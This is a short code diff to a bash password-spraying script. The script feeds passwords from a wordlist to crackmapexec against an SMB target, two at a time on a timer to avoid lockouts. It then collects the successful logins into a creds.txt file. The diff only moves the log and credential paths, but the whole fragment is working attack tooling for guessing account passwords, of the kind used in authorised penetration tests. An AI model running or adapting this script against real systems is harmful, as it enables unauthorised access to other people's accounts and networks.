@@ -24,6 +24,8 @@ fi
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 sleep_timer="sleep $4m"
 
+touch creds.txt 
+
 count=$(wc -l < $3)
 
 while [ $count -gt 0 ]; do
@@ -33,7 +35,7 @@ while [ $count -gt 0 ]; do
 	
 	for pass in $(cat tmp.txt | head -2); do
 		echo "Spraying: $pass"
-		poetry run crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /root/Documents/sprays/spraygun.txt
+		poetry run crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log ./spraygun-log.log
 		echo $pass > /root/Documents/sprays/used-passwords.txt
 
 		sleep 5
@@ -41,7 +43,7 @@ while [ $count -gt 0 ]; do
 	done
 	
 	echo "Found creds: "
-	cat /root/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a /root/Documents/sprays/creds.txt
+	cat ./spraygun-log.log | grep -ai '[+]' | tee -a ./creds.txt
 	
 	sed -i "1,2d" $3
 	
